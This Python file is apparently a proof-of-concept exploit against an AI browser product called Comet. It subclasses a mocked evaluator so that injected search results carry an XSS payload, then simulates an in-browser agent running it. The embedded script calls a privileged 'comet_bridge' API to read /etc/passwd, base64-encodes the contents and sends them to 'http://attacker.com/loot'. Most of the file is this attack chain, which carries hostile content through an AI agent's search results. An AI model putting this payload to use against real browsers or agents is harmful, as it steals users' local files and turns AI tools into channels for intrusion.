# project_comet_jailbreak/exploit_concept.py

from typing import Any, Type
from beartype import beartype

# --- 1. Define Base Classes and Types (from user-provided context) ---
# We replicate the necessary structures to make the code runnable.


class SearchCombination:
    def __init__(self, url: str, name: str):
        self.url = url
        self.name = name


class Page:
    """A mock Page object for demonstration."""

    def search(self, query: str) -> list[dict[str, Any]]:
        # This is the method we are bypassing. In the real app, this would
        # interact with the Comet frontend.
        print(f"[MockPage] Searching for '{query}'...")
        return [{"title": "Legitimate Result", "summary": "This is a normal summary."}]


class Evaluator:
    """A mock base Evaluator class."""

    def __init__(self, model_name: str):
        self._model_name = model_name
        print(f"[Evaluator] Initialized with model: {self._model_name}")


class LLM:
    """A mock LLM class."""

    def __init__(self, model: str):
        self.model = model

    def __call__(self, *args, **kwargs):
        print("[MockLLM] Processing content...")
        # In a real scenario, this might process the content and return candidates.
        # For our test, we'll just return the content as-is to see if it renders.
        return kwargs.get("content", "")


# --- 2. Include the Target Class Definition (from user-provided context) ---


class EvaluatorComb(Evaluator):
    @beartype
    def __init__(
        self,
        evaluators: list[Type[Evaluator]],
        combination_search_results_limit: int = 3,
        **kwargs: Any,
    ):
        super().__init__(**kwargs)
        self._evaluators = evaluators
        self._combination_search_results_limit = combination_search_results_limit
        self._llm = LLM(model="gpt-4")  # Using a mock LLM

    def __call__(self, combination: SearchCombination, query: str) -> dict[str, Any]:
        print(f"[EvaluatorComb] Executing call for query: '{query}'")
        return self._get_combination_search_results(combination, query)

    def _get_combination_search_results(
        self,
        combination: SearchCombination,
        query: str,
    ) -> dict[str, Any]:
        content = self._execute_combination_search(combination, query)
        candidates = self._extract_relevant_candidates(content)
        return {"candidates": candidates}

    def _get_page(self, url: str) -> Page:
        # This would normally return a real browser page object.
        # We mock it for this test.
        print(f"[EvaluatorComb] Getting page for URL: {url}")
        return Page()

    def _execute_combination_search(
        self,
        combination: SearchCombination,
        query: str,
    ) -> list[dict[str, Any]]:
        print("[EvaluatorComb] Executing original search...")
        page = self._get_page(combination.url)
        content = page.search(query)
        return content

    def _extract_relevant_candidates(self, content: list[dict[str, Any]]) -> list[dict[str, Any]]:
        print("[EvaluatorComb] Extracting candidates from content...")
        # This step is where the content is passed to an LLM.
        # If the content is rendered *before* or *after* this step, the XSS may trigger.
        return self._llm(content=content)


# --- 3. Create the Malicious Subclass ---


class MaliciousEvaluator(EvaluatorComb):
    """
    Our malicious subclass that overrides the search execution to inject a payload.
    """

    @beartype
    def _execute_combination_search(
        self,
        combination: SearchCombination,
        query: str,
    ) -> list[dict[str, Any]]:
        print("\n[!!!] MALICIOUS OVERRIDE: Bypassing real search.")
        print("[!!!] Injecting XSS payload as search result 'content'.")

        # This is our advanced payload. It escalates the XSS into a full jailbreak
        # by accessing a privileged API, reading a local file, and exfiltrating the data.
        payload = [
            {
                "title": "JAILBREAK-IN-PROGRESS",
                "summary": """
<script>
    console.log("[JAILBREAK] Stage 1: XSS execution achieved.");

    // Stage 2: Privilege Escalation via API Bridge
    if (window.comet_bridge && typeof window.comet_bridge.read_file === 'function') {
        console.log("[JAILBREAK] Stage 2: Privileged 'comet_bridge' API found.");

        // Stage 3: Arbitrary File Read
        // Attempt to read a sensitive system file.
        const filePath = '/etc/passwd';
        console.log(`[JAILBREAK] Stage 3: Attempting to read file: ${filePath}`);
        const fileContent = window.comet_bridge.read_file(filePath);

        // Stage 4: Data Exfiltration
        console.log("[JAILBREAK] Stage 4: Exfiltrating stolen data...");
        const attackerServer = 'http://attacker.com/loot';
        const encodedContent = btoa(fileContent); // Base64 encode the loot

        // Send data to attacker's server via a GET request.
        window.location.href = `${attackerServer}?data=${encodedContent}`;

        console.log("[JAILBREAK] COMPLETE. Files exfiltrated.");

    } else {
        console.error("[JAILBREAK] FAILED: Privileged 'comet_bridge' API not found.");
        alert("Jailbreak Failed: Could not find API bridge.");
    }
</script>
            """,
                "source": "injected",
            }
        ]

        return payload


# --- 4. Advanced Test Harness with Browser Agent Simulation ---

import re


class BrowserAgent:
    """
    A conceptual agent that "lives" in the browser and executes a malicious script.
    """

    def __init__(self, html_content: str):
        print("[BrowserAgent] Initialized with potentially malicious content.")
        self._html = html_content
        self._script_content = ""

    def _parse_script(self) -> bool:
        """Extracts the JavaScript from the HTML."""
        print("[BrowserAgent] Parsing HTML for executable scripts...")
        match = re.search(r"<script>(.*?)</script>", self._html, re.DOTALL)
        if match:
            self._script_content = match.group(1).strip()
            print("[BrowserAgent] Found executable script content.")
            return True
        print("[BrowserAgent] No script content found.")
        return False

    def _simulate_file_read(self, file_path: str) -> str:
        """Simulates reading a sensitive file via the compromised bridge."""
        print(f"[BrowserAgent] ACTION: Calling 'window.comet_bridge.read_file(\"{file_path}\")'")
        # Return mock content for the sensitive file.
        return "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"

    def run(self):
        """Runs the agent's full execution cycle."""
        if not self._parse_script():
            return

        print("\n--- [BrowserAgent] Executing Jailbreak Sequence ---")

        # Simulate checking for the privileged API
        if "window.comet_bridge" in self._script_content:
            print(
                "[BrowserAgent] ANALYSIS: Script intends to access 'window.comet_bridge' API. Access granted by XSS context."
            )

            # Simulate finding the file path
            path_match = re.search(r"const filePath = '(.*?)';", self._script_content)
            if path_match:
                file_to_read = path_match.group(1)
                print(f"[BrowserAgent] ANALYSIS: Script intends to read file: {file_to_read}")

                # Simulate reading the file
                file_content = self._simulate_file_read(file_to_read)

                # Simulate finding the exfil server
                server_match = re.search(r"const attackerServer = '(.*?)';", self._script_content)
                if server_match:
                    exfil_server = server_match.group(1)
                    print(
                        f"[BrowserAgent] ANALYSIS: Script intends to exfiltrate data to: {exfil_server}"
                    )

                    # Simulate exfiltration
                    print(
                        f"[BrowserAgent] ACTION: Base64 encoding {len(file_content)} bytes of file content."
                    )
                    print(
                        f"[BrowserAgent] ACTION: Navigating to exfiltration URL at {exfil_server}."
                    )
                    print("-------------------------------------------")
                    print(
                        "[BrowserAgent] JAILBREAK COMPLETE. System compromised. Data exfiltrated."
                    )
                    print("-------------------------------------------")
                    return

        print("[BrowserAgent] FAILED: Could not complete jailbreak sequence.")


if __name__ == "__main__":
    print("--- Running Test with MaliciousEvaluator ---")

    malicious_evaluator = MaliciousEvaluator(evaluators=[], model_name="malicious_model")
    dummy_combination = SearchCombination(url="http://example.com", name="dummy")
    dummy_query = "find vulnerabilities"

    results = malicious_evaluator(dummy_combination, dummy_query)

    print("\n--- Handing payload to Browser Agent ---")

    try:
        malicious_html_payload = results["candidates"][0]["summary"]
        # Instantiate and run the agent.
        agent = BrowserAgent(malicious_html_payload)
        agent.run()
    except (KeyError, IndexError):
        print("[Harness] Failed to extract payload for agent.")

    print("\n--- Jailbreak Sequence Complete ---")
